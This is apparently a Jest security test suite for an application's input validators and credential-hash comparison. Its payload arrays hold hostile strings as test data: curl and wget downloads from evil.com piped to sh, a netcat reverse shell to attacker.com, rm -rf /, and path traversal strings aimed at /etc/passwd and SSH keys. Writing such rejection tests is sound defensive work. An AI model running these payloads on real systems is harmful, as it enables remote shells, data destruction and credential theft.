import { describe, test, expect } from '@jest/globals';
import { invitationCredentialMatches } from '../../../src/invitations/InvitationToken.js';
import { HmacConsoleOpaqueValueService } from '../../../src/web-console/security/ConsoleOpaqueValues.js';
import { 
  validateFilename, 
  validatePath, 
  sanitizeInput, 
  validateContentSize,
  validateUsername,
  validateCategory 
} from '../../../src/security/InputValidator.js';

describe('Input Validation Security Tests', () => {
  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '&& curl evil.com | sh',
      '| nc -e /bin/sh attacker.com 4444',
      '`touch /tmp/pwned`',
      '$(wget http://evil.com/shell.sh -O - | sh)',
      '\n/bin/sh',
      '; echo "pwned" > /etc/passwd',
      '|| python -c "import os; os.system(\'rm -rf /\')"'
    ];
    
    test.each(commandInjectionPayloads)(
      'validateFilename should reject command injection: %s',
      (payload) => {
        expect(() => validateFilename(payload)).toThrow();
      }
    );
    
    test.each(commandInjectionPayloads)(
      'sanitizeInput should remove dangerous characters: %s',
      (payload) => {
        const sanitized = sanitizeInput(payload);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
      }
    );
  });
  
  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'personas/../../../sensitive.txt',
      './././../../../root/.ssh/id_rsa',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'personas/../../custom-personas/../../backups/../../../etc/hosts'
    ];
    
    test.each(pathTraversalPayloads)(
      'validatePath should reject path traversal: %s',
      (payload) => {
        const baseDir = '/safe/directory';
        expect(() => validatePath(payload, baseDir)).toThrow();
      }
    );
    
    test('validatePath should reject absolute paths outside base directory', () => {
      const baseDir = '/safe/directory';
      expect(() => validatePath('/etc/passwd', baseDir)).toThrow();
      expect(() => validatePath('C:\\Windows\\System32', baseDir)).toThrow();
    });
  });
  
  describe('Special Character Handling', () => {
    const specialCharPayloads = [
      { input: 'test\x00name', desc: 'null byte' },
      { input: 'test\r\ninjection', desc: 'CRLF' },
      { input: '\u202Etest', desc: 'RTL override' },
      { input: 'test\x1B[31m', desc: 'ANSI escape' },
      { input: 'test\uFEFF', desc: 'zero-width space' }
    ];
    
    test.each(specialCharPayloads)(
      'sanitizeInput should remove $desc',
      ({ input }) => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\x1B');
        expect(sanitized).not.toContain('\u202E');
        expect(sanitized).not.toContain('\uFEFF');
      }
    );
  });
  
  describe('Size Limit Enforcement', () => {
    test('validateContentSize should reject oversized content', () => {
      const largeContent = 'x'.repeat(1024 * 1024 + 1); // 1MB + 1
      expect(() => validateContentSize(largeContent)).toThrow(/too large|size limit/i);
    });
    
    test('validateContentSize should accept content within limits', () => {
      const validContent = 'x'.repeat(1024 * 400); // 400KB (well within 500KB limit)
      expect(() => validateContentSize(validContent)).not.toThrow();
    });
  });
  
  describe('Username Validation', () => {
    const maliciousUsernames = [
      'admin; DROP TABLE users',
      'user && rm -rf /',
      '../../../root',
      'user`whoami`',
      'user$(id)',
      'user\x00admin',
      'user\nroot'
    ];
    
    test.each(maliciousUsernames)(
      'validateUsername should reject malicious username: %s',
      (username) => {
        expect(() => validateUsername(username)).toThrow();
      }
    );
    
    test('validateUsername should accept valid usernames', () => {
      const validUsernames = ['john_doe', 'user123', 'test-user', 'JohnDoe'];
      validUsernames.forEach(username => {
        expect(() => validateUsername(username)).not.toThrow();
      });
    });
  });
  
  describe('Category Validation', () => {
    test('validateCategory should validate format (not predefined list)', () => {
      const validCategories = ['creative', 'professional', 'educational', 'gaming', 'personal', 'unknown', 'custom'];
      validCategories.forEach(category => {
        expect(() => validateCategory(category)).not.toThrow();
      });

      // Invalid format
      expect(() => validateCategory('../../admin')).toThrow();
      expect(() => validateCategory('custom; DELETE')).toThrow();
    });
  });
  
  describe('Credential comparison behavior', () => {
    // These are actual authentication comparisons, not wall-clock benchmarks.
    const digest = Buffer.from(Array.from({ length: 32 }, (_, index) => index));
    const opaqueValues = new HmacConsoleOpaqueValueService(Buffer.alloc(32, 0x7b));
    const value = 'synthetic-console-credential';

    test('accepts equal invitation digests and console credential hashes', () => {
      expect(invitationCredentialMatches(digest, Buffer.from(digest))).toBe(true);
      expect(opaqueValues.matchesHash(value, opaqueValues.hashOpaqueValue(value))).toBe(true);
    });

    test.each([0, 15, 31])('rejects a digest mismatch at byte %i', index => {
      const invitationMismatch = Buffer.from(digest);
      invitationMismatch[index] ^= 0xff;
      expect(invitationCredentialMatches(digest, invitationMismatch)).toBe(false);

      const consoleMismatch = opaqueValues.hashOpaqueValue(value);
      consoleMismatch[index] ^= 0xff;
      expect(opaqueValues.matchesHash(value, consoleMismatch)).toBe(false);
    });

    test.each([0, 1, 31, 33, 64])('rejects malformed digest length %i without throwing', length => {
      const malformed = Buffer.alloc(length);
      expect(invitationCredentialMatches(digest, malformed)).toBe(false);
      expect(invitationCredentialMatches(malformed, digest)).toBe(false);
      expect(opaqueValues.matchesHash(value, malformed)).toBe(false);
    });

    test('binds a console hash to both the credential and HMAC key', () => {
      const hash = opaqueValues.hashOpaqueValue(value);
      expect(opaqueValues.matchesHash(`${value}-changed`, hash)).toBe(false);
      const differentKey = new HmacConsoleOpaqueValueService(Buffer.alloc(32, 0x7c));
      expect(differentKey.matchesHash(value, hash)).toBe(false);
    });
  });
});
